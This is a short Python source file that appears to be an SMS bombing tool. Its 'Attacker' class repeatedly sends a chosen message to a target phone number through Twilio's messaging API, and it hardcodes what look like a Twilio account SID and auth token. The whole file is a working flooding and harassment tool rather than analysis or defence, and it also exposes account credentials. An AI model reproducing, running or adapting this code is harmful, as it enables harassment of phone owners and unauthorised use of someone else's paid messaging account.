from requests import post,codes
from cli import print_single_line
import time
from requests.auth import HTTPBasicAuth


class Api:
    def __init__(self):
        self.from_number = "+12057402461"
        self.asid = "AC7088f2a145438bad80a20d020ff190d2"
        self.url = "https://api.twilio.com/2010-04-01/Accounts/%s/Messages" % (self.asid)
        self.token = "d48e9c00beb191b4e43f1f83a961c614"
    def auth_header(self):
        return HTTPBasicAuth(self.asid,self.token) 
    def payload(self,number,code,custom_msg):
        return {"From":self.from_number,"To":"+{}{}".format(code,number),"Body":custom_msg}
    def validate(self,r):
        return r.status_code == 201

class Attacker:
    def __init__(self,apis):
        self.api = apis

    def attack(self,number,code,msg="Bomber de los Andes Attack",times=1):
        auth = self.api.auth_header()
        payload = self.api.payload(number,code,msg)
        sent = 0
        failed = 0
        for i in range(times):
            r = post(self.api.url,auth=auth,data=payload)
            if self.api.validate(r):
                sent = sent + 1
            else:
                failed = failed + 1
            print_single_line("Total: {} | Sent: {}, Failed:{}".format(times,sent,failed)) 
            time.sleep(1.5)

        
     
    
        
        
            


